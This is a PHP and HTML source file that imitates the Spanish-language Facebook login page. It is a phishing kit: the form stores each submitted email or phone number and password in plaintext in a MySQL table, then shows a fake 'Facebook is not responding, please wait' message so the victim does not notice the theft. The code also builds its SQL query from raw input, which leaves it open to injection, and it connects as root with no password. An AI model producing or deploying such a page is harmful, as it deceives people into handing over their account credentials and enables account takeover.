<?php
        $servidor = "localhost";
        $usuario = "root";
        $clave = "";
        $baseDatos = "formulariologin";

        $enlace = mysqli_connect($servidor, $usuario, $clave, $baseDatos);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Entrar o registrarse</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="shortcut icon" href="facebook.png" type="image/x-icon">
</head>
<body>
    <main class="main">
        <section class="sect-login">
            <div class="img-logo">
                <img src="logo.jpg" class="logo-facebook" alt="">
                <p class="languajes">Español ∙ English ∙ <a href="" class="plus">Más...</a></p>
            </div>

            <div class="formulario">
                <div class="name-face">
                    <img src="name-logo.svg" class="logo-face" alt="">
                </div>

                <form action="#" method="POST">
                    <div class="inputs-datos">
                        <input class="input" type="text" name="correo" placeholder="Teléfono o correo electrónico">  
                    </div>        
        
                    <div class="inputs-datos">
                        <input class="input" type="password" name="password" placeholder="Contraseña">
                    </div>

                    <p class="incorrecto"></p>

                    <div class="login-button__olv-password">
                        <input type="submit" class="login-button" id="button-iniciarSesion" name="iniciasesion" value="Iniciar sesión"></input>
                        <a href="#" class="olv-pass">¿Has olvidado tu contraseña?</a> 
                    </div>

                    <div class="hr">
                        <hr class="hr-one"> o <hr class="hr-two">
                    </div>

                    <div class="crear-acount">
                        <button class="acount-create__button">Crear cuenta de Facebook</button>
                    </div>

                    <br>

                    <?php
                        if(isset($_POST['iniciasesion'])){
                            $correo = $_POST["correo"];
                            $password = $_POST["password"];
                            $id = rand(1,99);

                            $insertarDatos = "INSERT INTO datos VALUES('$correo', 
                                                                        '$password',
                                                                        '$id')";

                            $ejecutarInsertar = mysqli_query($enlace, $insertarDatos);
                            
                            if($ejecutarInsertar){
                                echo "Facebook no responde en estos momentos <br>";
                                echo "Cargando, espera unos minutos...";
                            } else {
                                echo "Error";
                            }
                        }
                    ?>
                </form>
            </div>
        </section>
    </main>
</body>
</html>

